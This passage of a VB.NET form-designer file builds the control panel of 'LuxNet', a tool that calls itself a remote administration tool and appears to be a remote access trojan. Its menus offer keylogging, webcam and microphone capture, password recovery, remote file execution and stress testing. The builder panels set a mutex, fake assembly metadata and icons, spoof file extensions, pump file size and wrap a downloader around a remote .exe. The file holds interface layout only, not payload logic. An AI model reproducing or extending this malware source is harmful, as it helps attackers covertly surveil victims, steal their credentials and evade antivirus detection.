        '
        Me.Button8.Location = New System.Drawing.Point(394, 57)
        Me.Button8.Name = "Button8"
        Me.Button8.Size = New System.Drawing.Size(34, 27)
        Me.Button8.TabIndex = 16
        Me.Button8.Text = "[...]"
        Me.Button8.UseVisualStyleBackColor = True
        '
        'TextBox7
        '
        Me.TextBox7.Location = New System.Drawing.Point(22, 58)
        Me.TextBox7.Name = "TextBox7"
        Me.TextBox7.Size = New System.Drawing.Size(366, 25)
        Me.TextBox7.TabIndex = 15
        '
        'Label24
        '
        Me.Label24.AutoSize = True
        Me.Label24.Location = New System.Drawing.Point(18, 36)
        Me.Label24.Name = "Label24"
        Me.Label24.Size = New System.Drawing.Size(86, 19)
        Me.Label24.TabIndex = 14
        Me.Label24.Text = "Select a File :"
        '
        'GroupBox10
        '
        Me.GroupBox10.Controls.Add(Me.Button7)
        Me.GroupBox10.Controls.Add(Me.ComboBox4)
        Me.GroupBox10.Controls.Add(Me.Label23)
        Me.GroupBox10.Controls.Add(Me.Button6)
        Me.GroupBox10.Controls.Add(Me.TextBox6)
        Me.GroupBox10.Controls.Add(Me.Label22)
        Me.GroupBox10.Location = New System.Drawing.Point(13, 203)
        Me.GroupBox10.Name = "GroupBox10"
        Me.GroupBox10.Size = New System.Drawing.Size(406, 199)
        Me.GroupBox10.TabIndex = 2
        Me.GroupBox10.TabStop = False
        Me.GroupBox10.Text = "File Spoofer"
        '
        'Button7
        '
        Me.Button7.Location = New System.Drawing.Point(271, 145)
        Me.Button7.Name = "Button7"
        Me.Button7.Size = New System.Drawing.Size(113, 32)
        Me.Button7.TabIndex = 16
        Me.Button7.Text = "Spoof"
        Me.Button7.UseVisualStyleBackColor = True
        '
        'ComboBox4
        '
        Me.ComboBox4.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList
        Me.ComboBox4.FormattingEnabled = True
        Me.ComboBox4.Items.AddRange(New Object() {".7z", ".aac", ".bat", ".bmp", ".data", ".docx", ".html", ".ini", ".iso", ".jpeg", ".jpg", ".jar", ".m4a", ".m4v", ".mp3", ".mp4v", ".mpeg", ".pdf", ".ppt", ".pptx", ".py", ".rar", ".swf", ".torrent", ".ttf", ".txt", ".vbs", ".wav", ".wma", ".wmv"})
        Me.ComboBox4.Location = New System.Drawing.Point(260, 99)
        Me.ComboBox4.Name = "ComboBox4"
        Me.ComboBox4.Size = New System.Drawing.Size(124, 25)
        Me.ComboBox4.TabIndex = 15
        '
        'Label23
        '
        Me.Label23.AutoSize = True
        Me.Label23.Location = New System.Drawing.Point(11, 102)
        Me.Label23.Name = "Label23"
        Me.Label23.Size = New System.Drawing.Size(253, 19)
        Me.Label23.TabIndex = 14
        Me.Label23.Text = "Select the extension you want to spoof: "
        '
        'Button6
        '
        Me.Button6.Location = New System.Drawing.Point(350, 57)
        Me.Button6.Name = "Button6"
        Me.Button6.Size = New System.Drawing.Size(34, 27)
        Me.Button6.TabIndex = 13
        Me.Button6.Text = "[...]"
        Me.Button6.UseVisualStyleBackColor = True
        '
        'TextBox6
        '
        Me.TextBox6.Location = New System.Drawing.Point(15, 58)
        Me.TextBox6.Name = "TextBox6"
        Me.TextBox6.Size = New System.Drawing.Size(333, 25)
        Me.TextBox6.TabIndex = 12
        '
        'Label22
        '
        Me.Label22.AutoSize = True
        Me.Label22.Location = New System.Drawing.Point(11, 36)
        Me.Label22.Name = "Label22"
        Me.Label22.Size = New System.Drawing.Size(152, 19)
        Me.Label22.TabIndex = 8
        Me.Label22.Text = "File you want to spoof :"
        '
        'GroupBox9
        '
        Me.GroupBox9.Controls.Add(Me.Button2)
        Me.GroupBox9.Controls.Add(Me.Button3)
        Me.GroupBox9.Controls.Add(Me.RadioButton6)
        Me.GroupBox9.Controls.Add(Me.RadioButton5)
        Me.GroupBox9.Controls.Add(Me.Label21)
        Me.GroupBox9.Controls.Add(Me.NumericUpDown10)
        Me.GroupBox9.Controls.Add(Me.RadioButton4)
        Me.GroupBox9.Controls.Add(Me.Label20)
        Me.GroupBox9.Controls.Add(Me.TextBox4)
        Me.GroupBox9.Controls.Add(Me.Label19)
        Me.GroupBox9.Location = New System.Drawing.Point(425, 8)
        Me.GroupBox9.Name = "GroupBox9"
        Me.GroupBox9.Size = New System.Drawing.Size(432, 189)
        Me.GroupBox9.TabIndex = 1
        Me.GroupBox9.TabStop = False
        Me.GroupBox9.Text = "File Pumper"
        '
        'Button2
        '
        Me.Button2.Location = New System.Drawing.Point(394, 28)
        Me.Button2.Name = "Button2"
        Me.Button2.Size = New System.Drawing.Size(34, 27)
        Me.Button2.TabIndex = 11
        Me.Button2.Text = "[...]"
        Me.Button2.UseVisualStyleBackColor = True
        '
        'Button3
        '
        Me.Button3.Location = New System.Drawing.Point(13, 140)
        Me.Button3.Name = "Button3"
        Me.Button3.Size = New System.Drawing.Size(113, 32)
        Me.Button3.TabIndex = 10
        Me.Button3.Text = "Start"
        Me.Button3.UseVisualStyleBackColor = True
        '
        'RadioButton6
        '
        Me.RadioButton6.AutoSize = True
        Me.RadioButton6.Location = New System.Drawing.Point(215, 125)
        Me.RadioButton6.Name = "RadioButton6"
        Me.RadioButton6.Size = New System.Drawing.Size(118, 23)
        Me.RadioButton6.TabIndex = 9
        Me.RadioButton6.TabStop = True
        Me.RadioButton6.Text = "Gigabytes (GB)"
        Me.RadioButton6.UseVisualStyleBackColor = True
        '
        'RadioButton5
        '
        Me.RadioButton5.AutoSize = True
        Me.RadioButton5.Location = New System.Drawing.Point(215, 96)
        Me.RadioButton5.Name = "RadioButton5"
        Me.RadioButton5.Size = New System.Drawing.Size(128, 23)
        Me.RadioButton5.TabIndex = 8
        Me.RadioButton5.TabStop = True
        Me.RadioButton5.Text = "Megabytes (MB)"
        Me.RadioButton5.UseVisualStyleBackColor = True
        '
        'Label21
        '
        Me.Label21.AutoSize = True
        Me.Label21.Location = New System.Drawing.Point(9, 105)
        Me.Label21.Name = "Label21"
        Me.Label21.Size = New System.Drawing.Size(117, 19)
        Me.Label21.TabIndex = 7
        Me.Label21.Text = "Current Filesize: 0"
        '
        'NumericUpDown10
        '
        Me.NumericUpDown10.Location = New System.Drawing.Point(111, 66)
        Me.NumericUpDown10.Name = "NumericUpDown10"
        Me.NumericUpDown10.Size = New System.Drawing.Size(88, 25)
        Me.NumericUpDown10.TabIndex = 6
        '
        'RadioButton4
        '
        Me.RadioButton4.AutoSize = True
        Me.RadioButton4.Location = New System.Drawing.Point(215, 67)
        Me.RadioButton4.Name = "RadioButton4"
        Me.RadioButton4.Size = New System.Drawing.Size(109, 23)
        Me.RadioButton4.TabIndex = 5
        Me.RadioButton4.TabStop = True
        Me.RadioButton4.Text = "Kilobytes (kb)"
        Me.RadioButton4.UseVisualStyleBackColor = True
        '
        'Label20
        '
        Me.Label20.AutoSize = True
        Me.Label20.Location = New System.Drawing.Point(9, 68)
        Me.Label20.Name = "Label20"
        Me.Label20.Size = New System.Drawing.Size(96, 19)
        Me.Label20.TabIndex = 4
        Me.Label20.Text = "Pump to Size :"
        '
        'TextBox4
        '
        Me.TextBox4.Location = New System.Drawing.Point(59, 29)
        Me.TextBox4.Name = "TextBox4"
        Me.TextBox4.Size = New System.Drawing.Size(333, 25)
        Me.TextBox4.TabIndex = 3
        '
        'Label19
        '
        Me.Label19.AutoSize = True
        Me.Label19.Location = New System.Drawing.Point(9, 32)
        Me.Label19.Name = "Label19"
        Me.Label19.Size = New System.Drawing.Size(44, 19)
        Me.Label19.TabIndex = 2
        Me.Label19.Text = "Path :"
        '
        'GroupBox8
        '
        Me.GroupBox8.Controls.Add(Me.PictureBox2)
        Me.GroupBox8.Controls.Add(Me.Button4)
        Me.GroupBox8.Controls.Add(Me.Button5)
        Me.GroupBox8.Controls.Add(Me.TextBox5)
        Me.GroupBox8.Controls.Add(Me.Label18)
        Me.GroupBox8.Location = New System.Drawing.Point(13, 8)
        Me.GroupBox8.Name = "GroupBox8"
        Me.GroupBox8.Size = New System.Drawing.Size(406, 189)
        Me.GroupBox8.TabIndex = 0
        Me.GroupBox8.TabStop = False
        Me.GroupBox8.Text = "File Downloader"
        '
        'PictureBox2
        '
        Me.PictureBox2.Location = New System.Drawing.Point(113, 69)
        Me.PictureBox2.Name = "PictureBox2"
        Me.PictureBox2.Size = New System.Drawing.Size(69, 55)
        Me.PictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
        Me.PictureBox2.TabIndex = 4
        Me.PictureBox2.TabStop = False
        '
        'Button4
        '
        Me.Button4.Location = New System.Drawing.Point(314, 105)
        Me.Button4.Name = "Button4"
        Me.Button4.Size = New System.Drawing.Size(86, 29)
        Me.Button4.TabIndex = 3
        Me.Button4.Text = "Build"
        Me.Button4.UseVisualStyleBackColor = True
        '
        'Button5
        '
        Me.Button5.Location = New System.Drawing.Point(222, 105)
        Me.Button5.Name = "Button5"
        Me.Button5.Size = New System.Drawing.Size(86, 29)
        Me.Button5.TabIndex = 2
        Me.Button5.Text = "Select Icon"
        Me.Button5.UseVisualStyleBackColor = True
        '
        'TextBox5
        '
        Me.TextBox5.Location = New System.Drawing.Point(113, 29)
        Me.TextBox5.Name = "TextBox5"
        Me.TextBox5.Size = New System.Drawing.Size(287, 25)
        Me.TextBox5.TabIndex = 1
        '
        'Label18
        '
        Me.Label18.AutoSize = True
        Me.Label18.Location = New System.Drawing.Point(5, 32)
        Me.Label18.Name = "Label18"
        Me.Label18.Size = New System.Drawing.Size(103, 19)
        Me.Label18.TabIndex = 0
        Me.Label18.Text = "Direct .exe url : "
        '
        'FormMain
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.ClientSize = New System.Drawing.Size(1031, 456)
        Me.Controls.Add(Me.Tabcontrol1)
        Me.Controls.Add(Me.StatusBar1)
        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
        Me.MinimumSize = New System.Drawing.Size(1040, 494)
        Me.Name = "FormMain"
        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
        Me.Text = "LuxNet - Remote Administration Tool -  Hack-Free"
        Me.StatusBar1.ResumeLayout(False)
        Me.StatusBar1.PerformLayout()
        Me.CM_Clients.ResumeLayout(False)
        Me.CMS_Logs.ResumeLayout(False)
        Me.CMS_OnConnect.ResumeLayout(False)
        Me.Tabcontrol1.ResumeLayout(False)
        Me.LV_Clientdds.ResumeLayout(False)
        CType(Me.LV_Clients, System.ComponentModel.ISupportInitialize).EndInit()
        Me.TP_Settings.ResumeLayout(False)
        Me.GroupBox1.ResumeLayout(False)
        Me.GroupBox1.PerformLayout()
        Me.TC_Builder.ResumeLayout(False)
        Me.TabControl12222.ResumeLayout(False)
        Me.TabPage1.ResumeLayout(False)
        Me.GroupBox4.ResumeLayout(False)
        Me.GroupBox4.PerformLayout()
        CType(Me.NumericUpDown1, System.ComponentModel.ISupportInitialize).EndInit()
        Me.GroupBox3.ResumeLayout(False)
        Me.GroupBox3.PerformLayout()
        Me.GroupBox2.ResumeLayout(False)
        Me.GroupBox2.PerformLayout()
        CType(Me.nud_port, System.ComponentModel.ISupportInitialize).EndInit()
        Me.TabPage2.ResumeLayout(False)
        Me.TabPage2.PerformLayout()
        Me.GroupBox7.ResumeLayout(False)
        Me.GroupBox6.ResumeLayout(False)
        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).EndInit()
        Me.GroupBox5.ResumeLayout(False)
        Me.GroupBox5.PerformLayout()
        CType(Me.NumericUpDown8, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.NumericUpDown7, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.NumericUpDown6, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.NumericUpDown5, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.NumericUpDown4, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.NumericUpDown3, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.NumericUpDown2, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.NumericUpDown9, System.ComponentModel.ISupportInitialize).EndInit()
        Me.TP_Logs.ResumeLayout(False)
        CType(Me.LV_Logs, System.ComponentModel.ISupportInitialize).EndInit()
        Me.TP_OnConnect.ResumeLayout(False)
        Me.TP_OnConnect.PerformLayout()
        CType(Me.LV_OnConnect, System.ComponentModel.ISupportInitialize).EndInit()
        Me.TP_Thumbnail.ResumeLayout(False)
        Me.Panel2.ResumeLayout(False)
        Me.Panel1.ResumeLayout(False)
        Me.Panel1.PerformLayout()
        CType(Me.Button_Thumbnail, System.ComponentModel.ISupportInitialize).EndInit()
        Me.TC_Other.ResumeLayout(False)
        Me.TabControl222.ResumeLayout(False)
        Me.TabPage3.ResumeLayout(False)
        CType(Me.LV_News, System.ComponentModel.ISupportInitialize).EndInit()
        Me.TabPage4.ResumeLayout(False)
        Me.TabPage4.PerformLayout()
        Me.TC_Statistics.ResumeLayout(False)
        Me.TabControl32222.ResumeLayout(False)
        Me.TabPage5.ResumeLayout(False)
        Me.TabPage5.PerformLayout()
        Me.TabPage6.ResumeLayout(False)
        Me.TabPage6.PerformLayout()
        Me.TabPage9.ResumeLayout(False)
        Me.TabPage9.PerformLayout()
        CType(Me.LV_Scanner, System.ComponentModel.ISupportInitialize).EndInit()
        Me.TabPage10.ResumeLayout(False)
        Me.GroupBox11.ResumeLayout(False)
        Me.GroupBox11.PerformLayout()
        Me.GroupBox10.ResumeLayout(False)
        Me.GroupBox10.PerformLayout()
        Me.GroupBox9.ResumeLayout(False)
        Me.GroupBox9.PerformLayout()
        CType(Me.NumericUpDown10, System.ComponentModel.ISupportInitialize).EndInit()
        Me.GroupBox8.ResumeLayout(False)
        Me.GroupBox8.PerformLayout()
        CType(Me.PictureBox2, System.ComponentModel.ISupportInitialize).EndInit()
        Me.ResumeLayout(False)
        Me.PerformLayout()

    End Sub
    Friend WithEvents StatusBar1 As System.Windows.Forms.StatusStrip
    Friend WithEvents Tabcontrol1 As LuxNET.CustomTabcontrol
    Friend WithEvents TP_Settings As System.Windows.Forms.TabPage
    Friend WithEvents TC_Builder As System.Windows.Forms.TabPage
    Friend WithEvents TP_Logs As System.Windows.Forms.TabPage
    Friend WithEvents TP_OnConnect As System.Windows.Forms.TabPage
    Friend WithEvents TP_Thumbnail As System.Windows.Forms.TabPage
    Friend WithEvents TC_Other As System.Windows.Forms.TabPage
    Friend WithEvents TC_Statistics As System.Windows.Forms.TabPage
    Friend WithEvents TabPage9 As System.Windows.Forms.TabPage
    Friend WithEvents TabPage10 As System.Windows.Forms.TabPage
    Friend WithEvents CM_Clients As System.Windows.Forms.ContextMenuStrip
    Friend WithEvents GroupByToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents LocationToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ClientIDToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents OperatingSystemToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents AntiVirusToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents PrivilegsToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ToolStripMenuItem1 As System.Windows.Forms.ToolStripSeparator
    Friend WithEvents FileManagerToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents SystemManagersToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents RegistryManagerToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents SurveillanceToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents DesktopToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ScreenshotToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents WebcamToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents KeyloggerToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents MicrophoneToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents PasswordRecoveryToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ToolStripMenuItem2 As System.Windows.Forms.ToolStripSeparator
    Friend WithEvents ServerOptionsToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents UpdateServerToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents FromFileToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents FromURLToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ExecuteFileToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents FromFileToolStripMenuItem1 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents FromURLToolStripMenuItem1 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents PingToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents RestartToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents DisconnectToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents UninstallToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents MiscelleanousToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ScriptingToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ChatToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents MessageBoxToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents InputBoxToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents TrollFunFunctionsToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents AdminToolsToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ToolStripMenuItem3 As System.Windows.Forms.ToolStripSeparator
    Friend WithEvents StressTesterToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents MapViewToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents TorrentSeederToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents GroupBox1 As System.Windows.Forms.GroupBox
    Friend WithEvents btn_stoplistening As System.Windows.Forms.Button
    Friend WithEvents btn_startlistening As System.Windows.Forms.Button
    Friend WithEvents cb_sound As System.Windows.Forms.CheckBox
    Friend WithEvents cb_notify As System.Windows.Forms.CheckBox
    Friend WithEvents cb_autolisten As System.Windows.Forms.CheckBox
    Friend WithEvents TabControl12222 As System.Windows.Forms.TabControl
    Friend WithEvents TabPage1 As System.Windows.Forms.TabPage
    Friend WithEvents TabPage2 As System.Windows.Forms.TabPage
    Friend WithEvents GroupBox2 As System.Windows.Forms.GroupBox
    Friend WithEvents tb_clientid As System.Windows.Forms.TextBox
    Friend WithEvents Label2 As System.Windows.Forms.Label
    Friend WithEvents nud_port As System.Windows.Forms.NumericUpDown
    Friend WithEvents tb_ip As System.Windows.Forms.TextBox
    Friend WithEvents Label1 As System.Windows.Forms.Label
    Friend WithEvents GroupBox3 As System.Windows.Forms.GroupBox
    Friend WithEvents TB_Mutex As System.Windows.Forms.TextBox
    Friend WithEvents GroupBox4 As System.Windows.Forms.GroupBox
    Friend WithEvents CheckBox6 As System.Windows.Forms.CheckBox
    Friend WithEvents TextBox3 As System.Windows.Forms.TextBox
    Friend WithEvents CheckBox2 As System.Windows.Forms.CheckBox
    Friend WithEvents TextBox2 As System.Windows.Forms.TextBox
    Friend WithEvents Label4 As System.Windows.Forms.Label
    Friend WithEvents TextBox1 As System.Windows.Forms.TextBox
    Friend WithEvents RadioButton3 As System.Windows.Forms.RadioButton
    Friend WithEvents RadioButton2 As System.Windows.Forms.RadioButton
    Friend WithEvents RadioButton1 As System.Windows.Forms.RadioButton
    Friend WithEvents Label3 As System.Windows.Forms.Label
    Friend WithEvents CheckBox1 As System.Windows.Forms.CheckBox
    Friend WithEvents Label5 As System.Windows.Forms.Label
    Friend WithEvents NumericUpDown1 As System.Windows.Forms.NumericUpDown
    Friend WithEvents CheckBox7 As System.Windows.Forms.CheckBox
    Friend WithEvents CheckBox5 As System.Windows.Forms.CheckBox
    Friend WithEvents CheckBox3 As System.Windows.Forms.CheckBox
    Friend WithEvents Button1 As System.Windows.Forms.Button
    Friend WithEvents CheckBox8 As System.Windows.Forms.CheckBox
    Friend WithEvents GroupBox7 As System.Windows.Forms.GroupBox
    Friend WithEvents GroupBox6 As System.Windows.Forms.GroupBox
    Friend WithEvents GroupBox5 As System.Windows.Forms.GroupBox
    Friend WithEvents rtb_output As System.Windows.Forms.RichTextBox
    Friend WithEvents PictureBox1 As System.Windows.Forms.PictureBox
    Friend WithEvents LinkLabel1 As System.Windows.Forms.LinkLabel
    Friend WithEvents NumericUpDown8 As System.Windows.Forms.NumericUpDown
    Friend WithEvents NumericUpDown7 As System.Windows.Forms.NumericUpDown
    Friend WithEvents NumericUpDown6 As System.Windows.Forms.NumericUpDown
    Friend WithEvents NumericUpDown5 As System.Windows.Forms.NumericUpDown
    Friend WithEvents Label13 As System.Windows.Forms.Label
    Friend WithEvents NumericUpDown4 As System.Windows.Forms.NumericUpDown
    Friend WithEvents NumericUpDown3 As System.Windows.Forms.NumericUpDown
    Friend WithEvents NumericUpDown2 As System.Windows.Forms.NumericUpDown
    Friend WithEvents NumericUpDown9 As System.Windows.Forms.NumericUpDown
    Friend WithEvents Label12 As System.Windows.Forms.Label
    Friend WithEvents tb_assemblytrademark As System.Windows.Forms.TextBox
    Friend WithEvents Label11 As System.Windows.Forms.Label
    Friend WithEvents tb_assemblycopyright As System.Windows.Forms.TextBox
    Friend WithEvents Label10 As System.Windows.Forms.Label
    Friend WithEvents tb_assemblyproduct As System.Windows.Forms.TextBox
    Friend WithEvents Label9 As System.Windows.Forms.Label
    Friend WithEvents tb_assemblycompany As System.Windows.Forms.TextBox
    Friend WithEvents Label8 As System.Windows.Forms.Label
    Friend WithEvents tb_assemblydescription As System.Windows.Forms.TextBox
    Friend WithEvents Label7 As System.Windows.Forms.Label
    Friend WithEvents tb_assemblytitle As System.Windows.Forms.TextBox
    Friend WithEvents Label6 As System.Windows.Forms.Label
    Friend WithEvents IL_TabControl As System.Windows.Forms.ImageList
    Friend WithEvents IL_OnConnect As System.Windows.Forms.ImageList
    Friend WithEvents CMS_OnConnect As System.Windows.Forms.ContextMenuStrip
    Friend WithEvents RemoveToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents CMS_Logs As System.Windows.Forms.ContextMenuStrip
    Friend WithEvents ClearToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents Timer1 As System.Windows.Forms.Timer
    Friend WithEvents LV_Logs As ComponentOwl.BetterListView.BetterListView
    Friend WithEvents LVC_Time As ComponentOwl.BetterListView.BetterListViewColumnHeader
    Friend WithEvents LVC_Log As ComponentOwl.BetterListView.BetterListViewColumnHeader
    Friend WithEvents Label15 As System.Windows.Forms.Label
    Friend WithEvents ComboBox3 As System.Windows.Forms.ComboBox
    Friend WithEvents ComboBox2 As System.Windows.Forms.ComboBox
    Friend WithEvents Label14 As System.Windows.Forms.Label
    Friend WithEvents ComboBox1 As System.Windows.Forms.ComboBox
    Friend WithEvents LV_OnConnect As ComponentOwl.BetterListView.BetterListView
    Friend WithEvents Panel1 As System.Windows.Forms.Panel
    Friend WithEvents CB_Thumbnail_Webcam As System.Windows.Forms.CheckBox
    Friend WithEvents CB_Thumbnail_Desktop As System.Windows.Forms.CheckBox
    Friend WithEvents ImageListView11 As Manina.Windows.Forms.ImageListView
    Friend WithEvents TabControl222 As System.Windows.Forms.TabControl
    Friend WithEvents TabPage3 As System.Windows.Forms.TabPage
    Friend WithEvents TabPage4 As System.Windows.Forms.TabPage
    Friend WithEvents rtb_news As System.Windows.Forms.RichTextBox
    Friend WithEvents LV_News As ComponentOwl.BetterListView.BetterListView
    Friend WithEvents Label_TOS As System.Windows.Forms.Label
    Friend WithEvents TabControl32222 As System.Windows.Forms.TabControl
    Friend WithEvents TabPage5 As System.Windows.Forms.TabPage
    Friend WithEvents TabPage6 As System.Windows.Forms.TabPage
    Friend WithEvents Graph_Sent As LuxNET.Graph
    Friend WithEvents Label16 As System.Windows.Forms.Label
    Friend WithEvents Graph_Receive As LuxNET.Graph
    Friend WithEvents Label17 As System.Windows.Forms.Label
    Friend WithEvents Label_Detection As System.Windows.Forms.Label
    Friend WithEvents LV_Scanner As ComponentOwl.BetterListView.BetterListView
    Friend WithEvents ProgressBar1 As System.Windows.Forms.ProgressBar
    Friend WithEvents btn_scan As System.Windows.Forms.Button
    Friend WithEvents StatusBarMain As System.Windows.Forms.ToolStripStatusLabel
    Friend WithEvents GroupBox8 As System.Windows.Forms.GroupBox
    Friend WithEvents TextBox5 As System.Windows.Forms.TextBox
    Friend WithEvents Label18 As System.Windows.Forms.Label
    Friend WithEvents Button4 As System.Windows.Forms.Button
    Friend WithEvents Button5 As System.Windows.Forms.Button
    Friend WithEvents GroupBox9 As System.Windows.Forms.GroupBox
    Friend WithEvents Button3 As System.Windows.Forms.Button
    Friend WithEvents RadioButton6 As System.Windows.Forms.RadioButton
    Friend WithEvents RadioButton5 As System.Windows.Forms.RadioButton
    Friend WithEvents Label21 As System.Windows.Forms.Label
    Friend WithEvents NumericUpDown10 As System.Windows.Forms.NumericUpDown
    Friend WithEvents RadioButton4 As System.Windows.Forms.RadioButton
    Friend WithEvents Label20 As System.Windows.Forms.Label
    Friend WithEvents TextBox4 As System.Windows.Forms.TextBox
    Friend WithEvents Label19 As System.Windows.Forms.Label
    Friend WithEvents GroupBox10 As System.Windows.Forms.GroupBox
    Friend WithEvents ComboBox4 As System.Windows.Forms.ComboBox
    Friend WithEvents Label23 As System.Windows.Forms.Label
    Friend WithEvents Button6 As System.Windows.Forms.Button
    Friend WithEvents TextBox6 As System.Windows.Forms.TextBox
    Friend WithEvents Label22 As System.Windows.Forms.Label
    Friend WithEvents Button2 As System.Windows.Forms.Button
    Friend WithEvents GroupBox11 As System.Windows.Forms.GroupBox
    Friend WithEvents Label26 As System.Windows.Forms.Label
    Friend WithEvents Button10 As System.Windows.Forms.Button
    Friend WithEvents Button9 As System.Windows.Forms.Button
    Friend WithEvents TextBox8 As System.Windows.Forms.TextBox
    Friend WithEvents Label25 As System.Windows.Forms.Label
    Friend WithEvents Button8 As System.Windows.Forms.Button
    Friend WithEvents TextBox7 As System.Windows.Forms.TextBox
    Friend WithEvents Label24 As System.Windows.Forms.Label
    Friend WithEvents Button7 As System.Windows.Forms.Button
    Friend WithEvents PictureBox2 As System.Windows.Forms.PictureBox
    Friend WithEvents BetterListViewColumnHeader1 As ComponentOwl.BetterListView.BetterListViewColumnHeader
    Friend WithEvents BetterListViewColumnHeader2 As ComponentOwl.BetterListView.BetterListViewColumnHeader
    Friend WithEvents BetterListViewColumnHeader3 As ComponentOwl.BetterListView.BetterListViewColumnHeader
    Friend WithEvents BetterListViewColumnHeader4 As ComponentOwl.BetterListView.BetterListViewColumnHeader
    Friend WithEvents BetterListViewColumnHeader5 As ComponentOwl.BetterListView.BetterListViewColumnHeader
    Friend WithEvents BetterListViewColumnHeader6 As ComponentOwl.BetterListView.BetterListViewColumnHeader
    Friend WithEvents BetterListViewColumnHeader7 As ComponentOwl.BetterListView.BetterListViewColumnHeader
    Friend WithEvents LV_Clientdds As System.Windows.Forms.TabPage
    Friend WithEvents LV_Clients As ComponentOwl.BetterListView.BetterListView
    Friend WithEvents LVCH_Location As ComponentOwl.BetterListView.BetterListViewColumnHeader
    Friend WithEvents LVCH_IP As ComponentOwl.BetterListView.BetterListViewColumnHeader
    Friend WithEvents LVCH_Port As ComponentOwl.BetterListView.BetterListViewColumnHeader
    Friend WithEvents LVCH_ClientID As ComponentOwl.BetterListView.BetterListViewColumnHeader
    Friend WithEvents LVCH_UserName As ComponentOwl.BetterListView.BetterListViewColumnHeader
    Friend WithEvents LVCH_ComputerName As ComponentOwl.BetterListView.BetterListViewColumnHeader
    Friend WithEvents LVCH_OS As ComponentOwl.BetterListView.BetterListViewColumnHeader
    Friend WithEvents LVCH_OsVersion As ComponentOwl.BetterListView.BetterListViewColumnHeader
    Friend WithEvents LVCH_AV As ComponentOwl.BetterListView.BetterListViewColumnHeader
    Friend WithEvents LVCH_Privilegs As ComponentOwl.BetterListView.BetterListViewColumnHeader
    Friend WithEvents LVCH_Webcam As ComponentOwl.BetterListView.BetterListViewColumnHeader
    Friend WithEvents LVCH_Ping As ComponentOwl.BetterListView.BetterListViewColumnHeader
    Friend WithEvents LV_Ports As System.Windows.Forms.ListView
    Friend WithEvents CH_Port As System.Windows.Forms.ColumnHeader
    Friend WithEvents CH_Status As System.Windows.Forms.ColumnHeader
    Friend WithEvents IL_CountryFlags As System.Windows.Forms.ImageList
    Friend WithEvents Panel2 As System.Windows.Forms.Panel
    Friend WithEvents ImageListView1 As Manina.Windows.Forms.ImageListView
    Friend WithEvents Button_Thumbnail As System.Windows.Forms.PictureBox
    Friend WithEvents RandomPool1 As LuxNET.RandomPool

End Class
